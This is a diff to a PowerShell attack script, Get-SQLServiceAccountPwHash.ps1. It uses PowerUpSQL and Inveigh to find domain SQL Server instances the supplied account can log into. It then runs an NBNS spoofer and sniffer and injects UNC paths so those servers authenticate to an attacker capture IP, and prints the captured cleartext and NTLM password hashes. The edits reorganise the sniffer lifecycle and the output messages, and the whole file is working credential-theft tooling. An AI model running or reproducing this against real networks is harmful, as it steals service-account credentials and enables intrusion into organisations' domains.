@@ -2,7 +2,7 @@
 # script name: Get-SQLServiceAccountPwHash.ps1
 # requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
 # Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
-# Example: .\Get-SQLServiceAccountPwHash.ps1 -username domain\user -password SuperPassword! -domaincontroller 10.0.0.1
+# Example run as domain user: .\Get-SQLServiceAccountPwHash.ps1 -captureip 10.20.2.1
 #import-module .\powerupsql.psm1
 #import-module .\inveigh.ps1
 
@@ -28,16 +28,19 @@ Param(
 Write-output "Testings access to domain sql servers..."
 $SQLServerInstances = Get-SQLInstanceDomain -verbose -CheckMgmt -DomainController $domaincontroller -Username $username -Password $password | Get-SQLConnectionTestThreaded -Verbose -Threads 15 
 $SQLServerInstancesCount = $SQLServerInstances.count
-Write-output "$SQLServerInstancesCount MSSQL SPNs found"
-$SQLServerInstances
+Write-output "$SQLServerInstancesCount SQL Server instances found"
 
 # Get list of SQL Servers that the provided account can log into
-Write-output "Attacking each one..."
 $AccessibleSQLServers = $SQLServerInstances | ? {$_.status -eq "Accessible"}
-$AccessibleSQLServers
+$AccessibleSQLServersCount = $AccessibleSQLServers.count
 
 # Perform unc path injection on each one
-Write-output "Attacking accessible SQL Servers..."
+Write-output "$AccessibleSQLServersCount SQL Server instances can be logged into"
+Write-output "Attacking $AccessibleSQLServersCount accessible SQL Server instances..."
+
+# Start the sniffing
+Invoke-Inveigh -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
+
 $AccessibleSQLServers | 
 ForEach-Object{
     
@@ -45,12 +48,6 @@ ForEach-Object{
     $CurrentInstanceComputer = $_.ComputerName
     $CurrentInstanceIP = Resolve-DnsName $CurrentInstanceComputer| select IPaddress -ExpandProperty ipaddress
     $CurrentInstance = $_.Instance        
-
-    Write-Output "$CurrentInstance ($CurrentInstanceIP) - START"
-    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Starting sniffer"
-
-    # Start the sniffing
-    Invoke-Inveigh -SpooferHostsReply $CurrentInstance -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
 
     # Start unc path injection for each interface
     Write-Output "$CurrentInstance ($CurrentInstanceIP) - Injecting UNC path"
@@ -67,23 +64,18 @@ ForEach-Object{
      
     # Sleep to give the SQL Server time to connect to us
     sleep $timeout
-
-    # Stop sniffing
-    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Stopping sniffer"
-    Stop-Inveigh | Out-Null 
  
     # Get hashes
-    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Checking for captured password hashes"
+    Write-Output "Checking for captured password hashes"
     Get-InveighCleartext 
     Get-InveighNTLMv1
     Get-InveighNTLMv2
-
-    # Clear memory
-    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Cleaning up"
-    Clear-Inveigh | Out-Null 
-
-    Write-Output "$CurrentInstance ($CurrentInstanceIP) - END"
 }
 
+# Stop sniffing
+# Write-Output "Stopping sniffer"
+Stop-Inveigh | Out-Null 
 
-
+# Clear memory
+# Write-Output "Cleaning up"
+Clear-Inveigh | Out-Null 
